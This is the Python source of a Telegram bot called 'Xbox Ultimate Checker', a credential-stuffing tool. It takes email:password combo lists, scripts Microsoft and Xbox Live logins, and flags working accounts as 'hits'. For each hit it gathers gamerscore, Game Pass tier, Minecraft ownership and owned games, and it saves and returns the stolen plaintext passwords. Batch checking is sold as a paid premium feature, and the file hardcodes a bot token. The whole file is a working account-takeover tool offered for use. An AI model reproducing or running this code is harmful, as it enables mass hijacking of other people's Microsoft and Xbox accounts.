# xbox_telegram_bot_full_games.py - مع قائمة الألعاب الكاملة
import asyncio
import os
import sys
import time
import re
import json
import sqlite3
import threading
from datetime import datetime, timedelta
from io import BytesIO
from typing import Optional, Dict, List
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor

import aiohttp
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    PreCheckoutQueryHandler, ContextTypes, filters,
)
from telegram.constants import ParseMode
from requests.adapters import HTTPAdapter

# ========== CONFIG ==========
BOT_TOKEN = "8384676447:AAFUZJlfy3BpnU98EgLRkUjKz_b6UBDgyeY"
ADMIN_IDS = [8744777152]
DB_PATH = "xbox_users.db"
RESULTS_DIR = "XBOX_RESULTS"

# ========== PREMIUM CONFIG ==========
PREMIUM_STARS = 50
PREMIUM_DAYS = 30
FREE_CHECKS = 10
MAX_GAMES = 999  # الحد الأقصى للألعاب

# ========== CREATE FOLDERS ==========
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

# ========== DATABASE ==========
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            premium INTEGER DEFAULT 0,
            premium_until TEXT,
            checks_today INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0,
            hits INTEGER DEFAULT 0,
            last_reset TEXT,
            joined_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            email TEXT,
            gamerscore INTEGER,
            gamepass TEXT,
            minecraft INTEGER,
            games TEXT,
            checked_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS games (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            email TEXT,
            game_name TEXT,
            gamerscore INTEGER,
            unlocked INTEGER,
            checked_at TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

# ========== USER HELPERS ==========
def get_user(user_id: int) -> dict:
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return {
            "user_id": row[0],
            "username": row[1],
            "premium": row[2],
            "premium_until": row[3],
            "checks_today": row[4],
            "total_checks": row[5],
            "hits": row[6],
            "last_reset": row[7],
            "joined_at": row[8]
        }
    return None

def create_user(user_id: int, username: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    today = datetime.now().strftime("%Y-%m-%d")
    c.execute(
        "INSERT INTO users (user_id, username, last_reset, joined_at) VALUES (?, ?, ?, ?)",
        (user_id, username, today, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

def update_user(user_id: int, **kwargs):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    for key, value in kwargs.items():
        c.execute(f"UPDATE users SET {key} = ? WHERE user_id = ?", (value, user_id))
    conn.commit()
    conn.close()

def is_premium(user_id: int) -> bool:
    user = get_user(user_id)
    if not user or not user["premium"]:
        return False
    if user["premium_until"]:
        expiry = datetime.fromisoformat(user["premium_until"])
        return datetime.now() <= expiry
    return True

def can_check(user_id: int) -> bool:
    if is_premium(user_id):
        return True
    user = get_user(user_id)
    return user and user["checks_today"] < FREE_CHECKS

def reset_daily():
    conn = sqlite3.connect(DB_PATH)
    today = datetime.now().strftime("%Y-%m-%d")
    conn.execute("UPDATE users SET checks_today = 0, last_reset = ? WHERE last_reset != ?", (today, today))
    conn.commit()
    conn.close()

# ========== XBOX CHECKER ==========
class XboxChecker:
    def __init__(self):
        self.session = None
    
    def _get_session(self):
        if not self.session:
            self.session = requests.Session()
            self.session.verify = False
            self.session.mount('https://', HTTPAdapter(pool_connections=50, pool_maxsize=50))
            self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        return self.session
    
    def _get_all_games(self, session, uhs, xsts_token):
        """استخراج قائمة الألعاب الكاملة مع التفاصيل"""
        premium_keywords = [
            "resident evil", "fifa", "fc 24", "fc 25", "call of duty",
            "modern warfare", "black ops", "pes", "eFootball", "rust",
            "elden ring", "dark souls", "ark", "battlefield", "halo",
            "gears of war", "forza", "cyberpunk", "witcher", "gta", "red dead",
            "assassin", "far cry", "watch dogs", "division", "rainbow six",
            "doom", "wolfenstein", "fallout", "skyrim", "minecraft",
            "diablo", "overwatch", "destiny", "apex", "star wars",
            "lego", "batman", "spider-man", "god of war", "uncharted",
            "last of us", "horizon", "ghost of tsushima", "death stranding"
        ]
        
        games = []
        try:
            me_url = "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag"
            headers = {
                "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                "x-xbl-contract-version": "2",
                "Accept": "application/json"
            }
            me_resp = session.get(me_url, headers=headers, timeout=10)
            if me_resp.status_code == 200:
                xuid = me_resp.json()['profileUsers'][0]['id']
                
                # جلب كل الألعاب
                ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles?maxItems={MAX_GAMES}"
                ach_resp = session.get(ach_url, headers=headers, timeout=15)
                
                if ach_resp.status_code == 200:
                    titles = ach_resp.json().get('titles', [])
                    for t in titles:
                        game_name = t.get('name', 'Unknown')
                        current_score = t.get('currentGamerscore', 0)
                        unlocked = t.get('unlockedAchievements', 0)
                        total_ach = t.get('totalAchievements', 0)
                        
                        is_premium = any(key.lower() in game_name.lower() for key in premium_keywords)
                        
                        games.append({
                            "name": game_name,
                            "score": current_score,
                            "unlocked": unlocked,
                            "total": total_ach,
                            "premium": is_premium
                        })
        except:
            pass
        return games
    
    def _format_games_text(self, games: list, max_games: int = 20) -> str:
        """تنسيق قائمة الألعاب للنص"""
        if not games:
            return "No games found"
        
        # ترتيب حسب النقاط
        sorted_games = sorted(games, key=lambda x: x["score"], reverse=True)
        
        lines = []
        for i, game in enumerate(sorted_games[:max_games], 1):
            premium_icon = "⭐" if game["premium"] else ""
            ach_text = f"({game['unlocked']}/{game['total']} ach)" if game['total'] > 0 else ""
            lines.append(f"{i}. {game['name']} {premium_icon} - {game['score']}G {ach_text}")
        
        return "\n".join(lines)
    
    def check_account(self, combo: str) -> dict:
        parts = combo.split(':')
        if len(parts) < 2:
            return {"status": "BAD", "email": combo}
        
        email, password = parts[0].strip(), ':'.join(parts[1:]).strip()
        session = self._get_session()
        
        try:
            # Get SFTag
            sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
            resp = session.get(sftag_url, timeout=15)
            sftag = re.search(r'value=\\\"(.+?)\\\"', resp.text).group(1)
            url_post = re.search(r'"urlPost":"(.+?)"', resp.text).group(1)
            
            # Login
            login_req = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}, timeout=15)
            
            ms_token = None
            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif "password is incorrect" in login_req.text.lower():
                return {"status": "BAD", "email": email}
            
            if not ms_token:
                return {"status": "BAD", "email": email}
            
            # Xbox Auth
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', 
                json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, 
                      "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=15)
            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
            
            # XSTS Auth
            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', 
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, 
                      "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=15)
            
            gamerscore = 0
            all_games = []
            if xsts_xb_req.status_code == 200:
                x_token = xsts_xb_req.json()['Token']
                all_games = self._get_all_games(session, uhs, x_token)
                
                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamerscore", 
                    headers={"Authorization": f"XBL3.0 x={uhs};{x_token}", "x-xbl-contract-version": "2"}, timeout=15)
                if prof_req.status_code == 200:
                    gamerscore = int(prof_req.json()['profileUsers'][0]['settings'][0]['value'])
            
            if gamerscore < 5:
                return {"status": "BAD", "email": email}
            
            # Minecraft & GamePass
            gamepass_status = "None"
            minecraft_owned = False
            
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', 
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, 
                      "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, timeout=15)
            if xsts_mc_req.status_code == 200:
                mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                    json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_req.json()['Token']}"}, timeout=15)
                if mc_auth.status_code == 200:
                    ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', 
                        headers={'Authorization': f"Bearer {mc_auth.json()['access_token']}"}, timeout=15)
                    ent_t = ent_req.text.lower()
                    if 'product_game_pass_ultimate' in ent_t: gamepass_status = "Ultimate"
                    elif 'product_game_pass_pc' in ent_t: gamepass_status = "PC"
                    elif 'product_game_pass_extra' in ent_t: gamepass_status = "Extra"
                    elif 'product_game_pass_premium' in ent_t: gamepass_status = "Premium"
                    elif 'product_game_pass' in ent_t: gamepass_status = "Standard"
                    # Minecraft
                    if 'minecraft' in ent_t:
                        minecraft_owned = True
            
            return {
                "status": "HIT",
                "email": email,
                "password": password,
                "gamerscore": gamerscore,
                "gamepass": gamepass_status,
                "minecraft": minecraft_owned,
                "games": all_games,
                "games_text": self._format_games_text(all_games, 15),
                "games_full": self._format_games_text(all_games, 999),
                "total_games": len(all_games)
            }
            
        except Exception as e:
            return {"status": "ERROR", "email": email, "error": str(e)}
        finally:
            session.close()

# ========== BOT HANDLERS ==========
checker = XboxChecker()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    reset_daily()
    
    db_user = get_user(user_id)
    if not db_user:
        create_user(user_id, user.username or "")
        db_user = get_user(user_id)
    
    plan = "⭐ Premium" if is_premium(user_id) else f"🆓 Free ({FREE_CHECKS - db_user['checks_today']} left)"
    
    buttons = [
        [InlineKeyboardButton("🎮 Check Account", callback_data="check_single")],
        [InlineKeyboardButton("📂 Batch Check", callback_data="check_batch")],
        [InlineKeyboardButton("⭐ Premium", callback_data="premium")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
    ]
    if user_id in ADMIN_IDS:
        buttons.append([InlineKeyboardButton("🔧 Admin", callback_data="admin")])
    
    await update.message.reply_text(
        f"🎮 <b>Xbox Ultimate Checker</b>\n\n"
        f"👋 Welcome {user.first_name}!\n"
        f"📌 Plan: {plan}\n\n"
        f"⚡ Features:\n"
        f"├ ✅ Gamerscore\n"
        f"├ ✅ Game Pass Status\n"
        f"├ ✅ Minecraft Ownership\n"
        f"└ ✅ Full Games List (up to {MAX_GAMES} games)\n\n"
        f"💡 Send <code>email:password</code> or upload .txt file",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(buttons)
    )

async def handle_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if ":" not in text:
        await update.message.reply_text("❌ Format: <code>email:password</code>", parse_mode=ParseMode.HTML)
        return
    
    if not can_check(user_id):
        await update.message.reply_text(
            "❌ <b>Daily limit reached!</b>\n\n"
            "Upgrade to Premium for unlimited checks.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⭐ Buy Premium", callback_data="premium")]
            ])
        )
        return
    
    msg = await update.message.reply_text("⏳ <b>Checking...</b>", parse_mode=ParseMode.HTML)
    
    result = checker.check_account(text)
    
    db_user = get_user(user_id)
    update_user(user_id, checks_today=db_user['checks_today'] + 1, total_checks=db_user['total_checks'] + 1)
    
    if result["status"] == "HIT":
        update_user(user_id, hits=db_user['hits'] + 1)
        
        # Save to DB
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(
            "INSERT INTO results (user_id, email, gamerscore, gamepass, minecraft, games, checked_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (user_id, result['email'], result['gamerscore'], result['gamepass'], 
             1 if result['minecraft'] else 0, json.dumps(result['games']), datetime.now().isoformat())
        )
        # Save individual games
        for game in result['games']:
            c.execute(
                "INSERT INTO games (user_id, email, game_name, gamerscore, unlocked, checked_at) VALUES (?, ?, ?, ?, ?, ?)",
                (user_id, result['email'], game['name'], game['score'], game['unlocked'], datetime.now().isoformat())
            )
        conn.commit()
        conn.close()
        
        # Save to file
        with open(os.path.join(RESULTS_DIR, f"hits_{user_id}.txt"), "a", encoding="utf-8") as f:
            f.write(f"Email: {result['email']}\n")
            f.write(f"Password: {result['password']}\n")
            f.write(f"Gamerscore: {result['gamerscore']}G\n")
            f.write(f"Game Pass: {result['gamepass']}\n")
            f.write(f"Minecraft: {'YES' if result['minecraft'] else 'NO'}\n")
            f.write(f"Total Games: {result['total_games']}\n")
            f.write("-" * 40 + "\n")
            f.write(result['games_full'])
            f.write("\n" + "=" * 50 + "\n\n")
        
        # Send result
        games_preview = result['games_text']
        if len(games_preview) > 500:
            games_preview = games_preview[:500] + "..."
        
        await msg.edit_text(
            f"✅ <b>HIT FOUND!</b>\n\n"
            f"📧 <code>{result['email']}</code>\n"
            f"🔑 <code>{result['password']}</code>\n"
            f"🎯 Gamerscore: <b>{result['gamerscore']}G</b>\n"
            f"📦 Game Pass: <b>{result['gamepass']}</b>\n"
            f"⛏️ Minecraft: <b>{'✅ YES' if result['minecraft'] else '❌ NO'}</b>\n"
            f"🎮 Total Games: <b>{result['total_games']}</b>\n\n"
            f"📋 <b>Top Games:</b>\n<code>{games_preview}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📄 Full Games List", callback_data=f"full_games:{result['email']}")],
                [InlineKeyboardButton("📁 Download Games", callback_data=f"download_games:{result['email']}")]
            ])
        )
    else:
        await msg.edit_text(
            f"❌ <b>Check Failed</b>\n\n"
            f"📧 <code>{result['email']}</code>\n"
            f"⚠️ {result.get('error', 'Bad credentials or no Gamerscore')}",
            parse_mode=ParseMode.HTML
        )

async def handle_batch_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_premium(user_id):
        await update.message.reply_text(
            "❌ <b>Batch check requires Premium!</b>\n\n"
            "Upgrade to check multiple accounts.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⭐ Buy Premium", callback_data="premium")]
            ])
        )
        return
    
    if not update.message.document:
        await update.message.reply_text("📄 Please send a <code>.txt</code> file", parse_mode=ParseMode.HTML)
        return
    
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Send a <code>.txt</code> file", parse_mode=ParseMode.HTML)
        return
    
    file = await doc.get_file()
    content = await file.download_as_bytearray()
    lines = content.decode("utf-8", errors="ignore").splitlines()
    
    combos = [line.strip() for line in lines if ":" in line and line.strip()]
    
    if not combos:
        await update.message.reply_text("❌ No valid accounts found!", parse_mode=ParseMode.HTML)
        return
    
    msg = await update.message.reply_text(
        f"🚀 <b>Starting batch check</b>\n\n"
        f"📂 Total: <code>{len(combos)}</code> accounts\n\n"
        f"⏳ Processing...",
        parse_mode=ParseMode.HTML
    )
    
    hits = []
    done = 0
    
    for combo in combos:
        result = checker.check_account(combo)
        done += 1
        
        if result["status"] == "HIT":
            hits.append(result)
            # Save hit
            with open(os.path.join(RESULTS_DIR, f"batch_hits_{user_id}.txt"), "a", encoding="utf-8") as f:
                f.write(f"Email: {result['email']}\n")
                f.write(f"Password: {result['password']}\n")
                f.write(f"Gamerscore: {result['gamerscore']}G\n")
                f.write(f"Game Pass: {result['gamepass']}\n")
                f.write(f"Minecraft: {'YES' if result['minecraft'] else 'NO'}\n")
                f.write(f"Total Games: {result['total_games']}\n")
                f.write("-" * 40 + "\n")
                f.write(result['games_full'][:5000])
                f.write("\n" + "=" * 50 + "\n\n")
        
        if done % 10 == 0 or done == len(combos):
            try:
                await msg.edit_text(
                    f"🚀 <b>Batch Check</b>\n\n"
                    f"📂 Progress: <code>{done}/{len(combos)}</code>\n"
                    f"✅ Hits: <code>{len(hits)}</code>",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        
        await asyncio.sleep(0.1)
    
    # Summary
    if hits:
        db_user = get_user(user_id)
        update_user(user_id, hits=db_user['hits'] + len(hits))
        
        # Save to DB
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        for hit in hits:
            c.execute(
                "INSERT INTO results (user_id, email, gamerscore, gamepass, minecraft, games, checked_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (user_id, hit['email'], hit['gamerscore'], hit['gamepass'], 
                 1 if hit['minecraft'] else 0, json.dumps(hit['games']), datetime.now().isoformat())
            )
        conn.commit()
        conn.close()
        
        # Send hits file
        hits_file = os.path.join(RESULTS_DIR, f"batch_hits_{user_id}.txt")
        if os.path.exists(hits_file):
            with open(hits_file, "rb") as f:
                await update.message.reply_document(
                    document=InputFile(f, filename=f"hits_{user_id}.txt"),
                    caption=f"✅ {len(hits)} hits with full games!"
                )
    
    await msg.edit_text(
        f"✅ <b>Batch Complete!</b>\n\n"
        f"📂 Total: <code>{len(combos)}</code>\n"
        f"✅ Hits: <code>{len(hits)}</code>\n\n"
        f"{'📁 Results sent!' if hits else '📭 No hits found.'}",
        parseMode=ParseMode.HTML
    )

async def show_full_games(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    email = data.split(":")[1] if ":" in data else ""
    
    # Search for user's games
    user_id = query.from_user.id
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT games FROM results WHERE user_id = ? AND email = ? ORDER BY id DESC LIMIT 1", (user_id, email))
    row = c.fetchone()
    conn.close()
    
    if row and row[0]:
        games = json.loads(row[0])
        sorted_games = sorted(games, key=lambda x: x["score"], reverse=True)
        
        text = f"🎮 <b>Full Games List ({len(sorted_games)} games)</b>\n\n"
        for i, game in enumerate(sorted_games, 1):
            premium_icon = "⭐" if game.get("premium", False) else ""
            text += f"{i}. {game['name']} {premium_icon} - {game['score']}G\n"
            if len(text) > 4000:
                text += f"... and {len(sorted_games) - i} more games"
                break
        
        await query.edit_message_text(text[:4096], parse_mode=ParseMode.HTML)
    else:
        await query.edit_message_text("❌ No games found for this account", parse_mode=ParseMode.HTML)

async def download_games(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    email = data.split(":")[1] if ":" in data else ""
    
    user_id = query.from_user.id
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT games, gamerscore, gamepass, minecraft FROM results WHERE user_id = ? AND email = ? ORDER BY id DESC LIMIT 1", (user_id, email))
    row = c.fetchone()
    conn.close()
    
    if row:
        games = json.loads(row[0])
        gamerscore = row[1]
        gamepass = row[2]
        minecraft = "YES" if row[3] else "NO"
        
        sorted_games = sorted(games, key=lambda x: x["score"], reverse=True)
        
        text = f"XBOX GAMES LIST\n"
        text += f"Email: {email}\n"
        text += f"Gamerscore: {gamerscore}G\n"
        text += f"Game Pass: {gamepass}\n"
        text += f"Minecraft: {minecraft}\n"
        text += f"Total Games: {len(sorted_games)}\n"
        text += "=" * 50 + "\n\n"
        
        for i, game in enumerate(sorted_games, 1):
            premium_icon = "⭐ " if game.get("premium", False) else ""
            text += f"{i}. {premium_icon}{game['name']} - {game['score']}G\n"
        
        file_content = text.encode("utf-8")
        await query.message.reply_document(
            document=InputFile(BytesIO(file_content), filename=f"games_{email}.txt"),
            caption=f"🎮 {len(sorted_games)} games for {email}"
        )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    db_user = get_user(user_id)
    
    if not db_user:
        await update.message.reply_text("❌ Use /start first", parse_mode=ParseMode.HTML)
        return
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM results WHERE user_id = ?", (user_id,))
    total_hits = c.fetchone()[0] or 0
    c.execute("SELECT SUM(gamerscore) FROM results WHERE user_id = ?", (user_id,))
    total_score = c.fetchone()[0] or 0
    c.execute("SELECT COUNT(*) FROM games WHERE user_id = ?", (user_id,))
    total_games = c.fetchone()[0] or 0
    conn.close()
    
    plan = "⭐ Premium" if is_premium(user_id) else "🆓 Free"
    remaining = "∞" if is_premium(user_id) else str(FREE_CHECKS - db_user['checks_today'])
    
    await update.message.reply_text(
        f"📊 <b>Your Stats</b>\n\n"
        f"📌 Plan: {plan}\n"
        f"🔄 Checks Today: {db_user['checks_today']}\n"
        f"📊 Remaining: {remaining}\n"
        f"📈 Total Checks: {db_user['total_checks']}\n"
        f"🎯 Total Hits: {db_user['hits']}\n"
        f"🎮 Total Games: {total_games}\n"
        f"💯 Total Gamerscore: {total_score}\n"
        f"📅 Joined: {db_user['joined_at'][:10]}",
        parse_mode=ParseMode.HTML
    )

# ========== MAIN ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(show_full_games, pattern="^full_games:"))
    app.add_handler(CallbackQueryHandler(download_games, pattern="^download_games:"))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_batch_check))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r".+:.+"), handle_single_check))
    
    print("🚀 Xbox Ultimate Checker Bot is running...")
    print("🎮 Full Games List Enabled (max 999 games)")
    
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()